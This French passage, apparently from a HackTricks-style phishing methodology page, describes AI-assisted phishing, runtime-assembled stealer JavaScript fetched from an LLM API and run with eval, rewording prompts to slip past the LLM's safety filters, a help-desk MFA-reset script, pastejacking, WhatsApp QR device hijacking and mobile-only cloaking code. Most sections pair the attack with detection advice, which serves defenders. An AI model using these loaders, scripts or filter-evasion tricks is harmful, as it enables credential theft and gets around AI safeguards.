|IA générative|Produire des e-mails *uniques* faisant référence à des fusions-acquisitions publiques, à des plaisanteries internes issues des réseaux sociaux ; utiliser la voix deepfake d’un PDG dans une arnaque par rappel.|
|IA agentique|Enregistrer des domaines de façon autonome, extraire des renseignements open source et rédiger les e-mails de l’étape suivante lorsqu’une victime clique sans fournir ses identifiants.|

**Défense :**  
• Ajouter des **bannières dynamiques** signalant les messages envoyés par une automatisation non fiable (à l’aide d’anomalies ARC/DKIM).  
• Déployer des **phrases de vérification biométrique vocale** pour les demandes téléphoniques à haut risque.  
• Simuler en continu des leurres générés par IA dans les programmes de sensibilisation : les modèles statiques sont obsolètes.

Voir aussi – abus de la navigation agentique pour le phishing d’identifiants :

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Voir aussi – abus des outils CLI locaux et de MCP par des agents IA (pour l’inventaire des secrets et la détection) :

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblage à l’exécution de JavaScript de phishing assisté par LLM (génération de code dans le navigateur)

Les attaquants peuvent diffuser du HTML d’apparence bénigne et **générer le stealer à l’exécution** en demandant du JavaScript à une **API LLM de confiance**, puis en l’exécutant dans le navigateur (par exemple avec `eval` ou une balise `<script>` dynamique).<sup>[[8]](#references)</sup>

1. **Le prompt comme obfuscation :** encoder les URL d’exfiltration et les chaînes Base64 dans le prompt ; modifier sa formulation pour contourner les filtres de sécurité et réduire les hallucinations.
2. **Appel API côté client :** au chargement, le JS appelle un LLM public (Gemini/DeepSeek/etc.) ou un proxy CDN ; seul le prompt/l’appel API figure dans le HTML statique.
3. **Assembler et exécuter :** concaténer la réponse et l’exécuter (polymorphe à chaque visite) :

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil :** le code généré personnalise le leurre (p. ex., analyse des tokens LogoKit) et envoie les identifiants à l’endpoint masqué dans le prompt.

**Caractéristiques d’évasion**
- Le trafic passe par des domaines LLM connus ou des proxys CDN réputés, parfois via des WebSockets vers un backend.
- Aucun payload statique ; le JavaScript malveillant n’existe qu’après le rendu.
- Les générations non déterministes produisent des stealers **uniques** pour chaque session.

**Pistes de détection**
- Exécuter des sandboxes avec JavaScript activé ; détecter les appels `eval` à l’exécution et la création dynamique de scripts à partir de réponses de LLM.
- Rechercher des requêtes POST du front-end vers des API LLM, immédiatement suivies d’un `eval` ou d’un `Function` sur le texte reçu.
- Déclencher une alerte en cas de trafic client vers des domaines LLM non autorisés, suivi de requêtes POST contenant des identifiants.

---

## Variante MFA Fatigue / Push Bombing – Réinitialisation forcée
En plus du push-bombing classique, les opérateurs **forcent simplement l’enregistrement d’un nouveau MFA** pendant l’appel au support, invalidant ainsi le token existant de l’utilisateur. Toute demande de connexion ultérieure semble légitime à la victime.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Surveillez les événements AzureAD/AWS/Okta où **`deleteMFA` + `addMFA`** se produisent **à quelques minutes d’intervalle depuis la même IP**.



## Clipboard Hijacking / Pastejacking

Les attaquants peuvent copier silencieusement des commandes malveillantes dans le presse-papiers de la victime depuis une page web compromise ou typosquattée, puis inciter l’utilisateur à les coller dans **Win + R**, **Win + X** ou une fenêtre de terminal, exécutant ainsi du code arbitraire sans téléchargement ni pièce jointe.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Détournement de l’association d’un appareil WhatsApp via l’ingénierie sociale par QR code
* Une page leurre (par exemple, un faux « canal » d’un ministère ou d’un CERT) affiche un QR code WhatsApp Web/Desktop et demande à la victime de le scanner, ajoutant silencieusement l’attaquant comme **appareil lié**.<sup>[[12]](#references)</sup>
* L’attaquant accède immédiatement aux conversations et aux contacts jusqu’à la suppression de la session. Les victimes peuvent ensuite voir une notification indiquant qu’un « nouvel appareil a été associé » ; les défenseurs peuvent rechercher les événements d’association d’appareils inattendus survenus peu après la visite de pages QR non fiables.

### Phishing ciblant les appareils mobiles pour contourner les crawlers/sandboxes
Les opérateurs font de plus en plus passer leurs flux de phishing par une simple vérification de l’appareil afin que les crawlers de bureau n’atteignent jamais les pages finales. Un schéma courant consiste en un petit script qui vérifie la présence d’un DOM compatible avec les interactions tactiles et envoie le résultat à un endpoint serveur ; les clients non mobiles reçoivent une réponse HTTP 500 (ou une page blanche), tandis que les utilisateurs mobiles voient le flux complet.<sup>[[7]](#references)</sup>

Extrait minimal côté client (logique typique) :

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` logique (simplifiée) :

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Comportement du serveur souvent observé :
- Définit un cookie de session lors du premier chargement.
- Accepte `POST /detect {"is_mobile":true|false}`.
- Renvoie une erreur 500 (ou un contenu factice) aux GET suivants lorsque `is_mobile=false` ; ne sert le contenu de phishing que si `true`.

Pistes de recherche et heuristiques de détection :
- Requête urlscan : `filename:"detect_device.js" AND page.status:500`
- Télémétrie Web : séquence `GET /static/detect_device.js` → `POST /detect` → HTTP 500 pour les appareils non mobiles ; les parcours légitimes des victimes sur mobile renvoient 200, suivis de HTML/JS.
- Bloquer ou examiner les pages qui conditionnent leur contenu exclusivement à `ontouchstart` ou à des vérifications similaires de l’appareil.

Conseils de défense :
- Exécuter les crawlers avec des empreintes similaires à celles d’un appareil mobile et JavaScript activé afin de révéler le contenu masqué.
- Déclencher une alerte en cas de réponses 500 suspectes suivant `POST /detect` sur des domaines récemment enregistrés.

## References

- [1] [Génération de variantes de domaines utilisées dans le phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Détecter le phishing : outils et techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Voler des identifiants et contourner la 2FA avec noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Vol de sessions et contournement de la 2FA avec EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Comment installer et configurer DKIM avec Postfix sur Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Rapport mondial 2025 de Unit 42 sur la réponse aux incidents – Édition ingénierie sociale](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Smishing silencieux – infrastructure de phishing réservée aux mobiles et heuristiques (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [La prochaine frontière des attaques par assemblage à l’exécution : exploiter les LLM pour générer du JavaScript de phishing en temps réel](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Usurpation d’identité, détournement de clics et TDS : plongée dans un écosystème de distribution de malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting de Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Détournement du trafic vers windows.com de Microsoft par bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [L’amour ? En réalité : une fausse application de rencontre utilisée comme leurre dans une campagne de spyware ciblée au Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [Indicateurs de compromission et échantillons d’ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Dévoiler AdFection : comment Discover-Tech a transformé les publicités ciblées en vecteur de diffusion de spyware mercenaire sans clic](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
